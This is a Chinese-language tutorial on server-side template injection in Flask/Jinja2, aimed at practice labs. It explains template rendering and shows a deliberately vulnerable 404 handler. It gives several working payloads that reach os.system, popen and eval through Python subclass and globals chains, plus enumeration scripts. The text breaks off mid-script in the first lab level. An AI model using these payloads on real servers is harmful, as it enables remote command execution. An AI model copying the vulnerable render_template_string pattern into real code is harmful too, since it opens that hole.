# SSTI 介绍
SSTI 全称（Server-Side Template Injection),中文名服务端模板注入.
在介绍模板注入之前,首先得知道什么是模板.
### 什么是模板以及模板引擎
用通俗的话解释,模板就是一段话中存在可动态替换的部分.假设存在以下代码
    print(f"hello{username}")
由于这句代码能够因为不同的 `username`而显示不同的结果,因此我们可以简单的把这段话理解为一个模板.(当然这个例子不是很恰当)
而模板引擎的作用是为了使用户界面(例如上面的`hello+用户名`)与业务数据或内容(例如上面的username)生成特定的文档(如你所看到的HTML).
> 通俗点讲:拿到数据,塞到模板里,然后让渲染引擎将塞进去的东西生成 html 的文本,最后返回给浏览器.
采用模板以及模板引擎的好处可以让程序(网站)实现界面与数据分离,业务代码与逻辑代码的分离,这大大提升了开发效率,也使得代码重用变得更加容易.
但是由于渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入.
# Flask基础
本文主要学习和记录Python中Flask SSTI.在详细分析Flask SSTI之前,得先对Flask的基础语法有些了解.
> Flask 是一个用python实现的微型web框架,意味着flask能为您提供了工具、库和技术,使您可以构建web应用程序.
为了快速了解Flask基础,本人简单编写了一段代码`demo.py`,以此代码为例简单说明Flask语法
    from flask import Flask
    app = Flask(__name__)
    @app.route('/')
    def hello_world():
        return 'Hello World!'
    if __name__ == '__main__':
        app.run()
  1. 第一行,导入Flask类.用于后面实例化出一个WSGI应用程序.
  2. 创建Flask实例,传入的第一个参数为模块或包名.
  3. 使用`route()`装饰器告诉Flask怎样解析我们访问的URL.起路由作用.
  4. 下面跟着的函数将在访问对应路由时触发.比如此处我们访问网站根目录,将返回 `Hello Wrold`到对应页面.
  5. `app.run()`函数让应用在本地启动
运行此`.py`文件
并访问`http://127.0.0.1:5000`你将看到
Flask官网也提供了一篇快速入门的章节,可[点击此处](http://docs.jinkan.org/docs/flask/quickstart.html)前往阅读
# 模板渲染
Flask 使用了Jinja2 引擎来对模板进行渲染.
再给出渲染模板示例代码之前,咱们先创建个模板,命名为`demo_tmp.html`,内容如下:
        Welcome to Flask
          Hello, {{name}}!
其中,`{{}}`内是需要渲染的内容.
> jinja2模板中使用 {{ }}
> 语法表示一个变量,它是一种特殊的占位符.当利用jinja2进行渲染的时候,它会把这些特殊的占位符进行填充/替换,jinja2支持python中所有的Python数据类型比如列表、字段、对象等.
由于Flask 会在 templates
文件夹里寻找模板,所以需要在`demo.py`的同级目录下创建一个`templates`目录,并将`demo_tmp.html`放入.
稍微修改以下`demo.py`
    from flask import Flask
    from flask import request
    from flask import render_template
    app = Flask(__name__)
    @app.route('/',methods=['GET']
    def hello_world():
        query = request.args.get('name') # 获取get方法传递的 name的值
        return render_template('demo_tmp.html', name=query) # 将get接收到的name的值传入模板,进行渲染
    if __name__ == '__main__':
        app.run(debug=True)  # 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入
运行并访问`http://127.0.0.1:5000/?name=Noel`,可以看到结果如下结果
页面显示会随着传递给name参数的改变而改变.
那注入问题有又是怎么产生的呢?
# Flask SSTI
这里我先给出一段拥有ssti注入漏洞的flask代码:
    @app.errorhandler(404) 
    def page_not_found(e): 
        template = '''{%% extends "layout.html" %%} 
        {%% block body %%} 
            Opps! That page doesn't exist. 
            %s 
        {%% endblock %%} 
        ''' % (request.url) 
        return render_template_string(template), 404
> 代码来源于:
这段代码的逻辑为:当访问不存在的路由时或错误请求导致404时,将 URL
格式化为字符串并将其展示给用户.假设我们传入的url为`http://127.0.0.1:5000/`,访问,触发弹窗.
访问`http://127.0.0.1:5000/{{7*7}}`,发现 `{{7*7}}`被解析为 `49`
大家可以将漏洞代码和上面的`demo.py`进行对比,思考下为什么漏洞代码能够产生注入.
### 为什么产生 SSTI
其实对比两段代码很容易发现,
`demo.py`是使用`render_template('demo_tmp.html',
name=query)`,而使用这种方式渲染的优点在于需要渲染的参数是通过`name=query`写死了的,并未交给用户控制.
而在漏洞代码中
    template = '''{%% extends "layout.html" %%} 
        {%% block body %%} 
            Opps! That page doesn't exist. 
            %s 
        {%% endblock %%} 
        ''' % (request.url) 
    return render_template_string(template), 404
是直接将用户输入的url拼接到template中,再进行的渲染的.
由于url可控,所以整体template可控,如果传入的url中包含`{{xxx}}`,那么在使用`render_template_string(template)`进行渲染的时候就会把
`{{}}`中的内容进行解析.
# SSTI漏洞利用
既然说`{{}}`内能够解析表达式和代码,那我们试试直接插入 `import os;os.system('')`执行shell
很遗憾这种办法是行不通的.
原因是Jinjia 引擎限制了使用import.
那还有什么方法能够执行代码python吗
这时python的魔法方法和一些内置属性便能发挥作用.
这里我先给出一个 `payload`,通过 payload 来讲解相关魔法方法、内置属性以及利用过程.
`{{"".__class__.__base__.__subclasses__()[118].__init__.__globals__['system']('whoami')}}`
## 魔法方法和内置属性
`__class__`:返回该实例对象的类
    ''.__class__
    # 
`__base__`:返回该类的父类
    ''.__class__.__base__
    # 
    # 及 object 是 str 的基类(父类)
`__subclasses__`():返回当前类的所有子类,返回结果是个列表
    ''.__class__.__base__.__subclasses__()
    #[, , , , , , , , , , ...
很明显,上面这几个内置属性以及魔法方法能够帮助我们得到一些类.那我们得到这些类后干什么呢?
由于无法直接使用`import`导入模块,那我们就间接导入.通过上诉的一些内置属性和方法可以找到很多基类和子类,而有些基类和子类是存在一些引用模块的,只要我们初始化这个类,再利用`__globals__`调用可利用的函数,就能够达成我们的目的.
比如:我们想要执行系统函数,首先我们得知道python中那个函数能够执行系统函数.当然`system`能够达做到,所以我们得寻找哪些类能够调用`system`.本次实例中使用了118索引,索引的具体内容是``
选择初始化这个类是因为这个类属于`os
模块`,我们能够调用其中的`system`方法
除此之外,FLASK SSTI 常用来构建payload还有:
> 由于目前使用python3 版本较多,以下payload均使用python3实现
#### __builtins__
python在启动时就加载`__builtins__`,里面包含了一些常用方法比如:`abs()`,`max()`,`eval()`等等.详细信息大家可以去[官网](https://docs.python.org/3/library/builtins.html)了解.
那怎样去查找哪些类中拥有`__builtins__`呢:  
这个贴出个脚本`find_exp_class.py`,方便用来查找
    exp_flask = '__builtins__'
    number = 0 
    for i in "".__class__.__base__.__subclasses__():
        try:
            if "__import__()" in i.__init__.__globals__.keys():
                print(number,"-->>",i)
        except :
            pass
        finally:
            number += 1
在我本地(python3.6)运行,效果如下  
构建payload,可以看到能够执行系统命令
`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")`
#### sys
同样,更改`find_exp_class.py`中`exp_flask`的内容为`sys`,本地运行,得到相关类和索引如下:
构建payload,可以看到能够执行系统命令
`().__class__.__base__.__subclasses__()[64].__init__.__globals__['sys'].modules["os"].popen("whoami").read()`
其实这个payload的本质也是使用`os`模块
#### __import__
同样,更改`find_exp_class.py`中的`exp_flask`的内容为`__import__`,本地运行,得到相关类和索引如下:
构建payload,可以看到能够执行系统命令:
`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__import__']('os').system('whoami')`
同样,这个payload的本质也是使用`os`模块中的方法
有大佬把python目前自带函数全部搜集了起来并筛选出了可利用部分,详细可以参考这篇[博客](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python3)
# 练习
光说不练假把式.
在了解 **SSTI原理** 以及payload构造基础之后,来通过靶场练练手.学习一下常见trick
> 靶场来源于 Github:
## Level 1 no waf
第一关没waf
初步尝试 ,由于不好整理索引,写个脚本
    import requests
    url = "http://192.168.0.108:5001/level/1"
    for i in range(300):
        data = {"code": '{{"".__class__.__base__.__subclasses__()['+ str(i) +']}}'} 
        try:
            response = requests.post(url,data=data)
            #print(data)
            #print(response.text)
            if response.status_code == 200: